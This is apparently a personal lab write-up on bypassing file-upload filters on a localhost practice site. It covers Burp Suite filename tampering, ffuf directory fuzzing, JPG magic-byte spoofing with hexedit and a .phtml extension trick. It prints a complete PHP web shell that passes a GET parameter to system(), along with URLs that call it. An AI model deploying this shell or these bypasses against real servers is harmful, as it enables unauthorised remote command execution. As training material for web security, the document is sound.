# Basic Bypass
- website allows file upload
- Only JPG and PNG files, otherwise displays an error.
	- ![](assets/Pasted%20image%2020240211215518.png)
- Intercept requests using Burp Suite to check for restrictions.
- Upload PHP cmd file by manipulating the data and renaming it.
	- `filename=cmd.php`

- dirbust with ffuf
  ```bash
ffuf -ic -u "http://localhost/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 404,403,401 -fs 4431 -e .txt,.php,.bak,.sql
  ```

- fuzz labs
  ```bash
  $ ffuf -ic -u "http://localhost/labs/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 404,403,401 -fs 4431 -e .txt,.php,.bak,.sql
  ```
  - has /uploads
```bash
localhost/labs/uploads/cmd.php?cmd:ls%20/
```

# Magic Bytes

Magic Bytes are like secret codes in files that tell computers what type of file they are. You can find a bunch of them [here](https://en.wikipedia.org/wiki/List_of_file_signatures?ref=danielxblack.ghost.io).

## **Exploitation**

- create file with extension `.php.jpg`.
- put php file to check cmd:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

- uploaded `JPG` or `PNG` file, 
	- they have magic bytes: `FFD8 DDE0`, `FFD8 FFDB`, or `FFD8 FFE1`.
- tweak the first and last bytes using a tool called **hexedit**. 
	- `hexedit cmd.php`
	- Change the first bytes to: `FFD8 FFDB`
	- Change the last bytes to: `FFD9` (JPG file)

- upload file, then intercept the request.
- Forward to **Repeater** and rename to **cmd.php**

```bash
localhost/labs/uploads/cmd.php?cmd=ls+-la+%2F
```


# Challenge
- use previous payload
- bypass filetype check with `.phtml`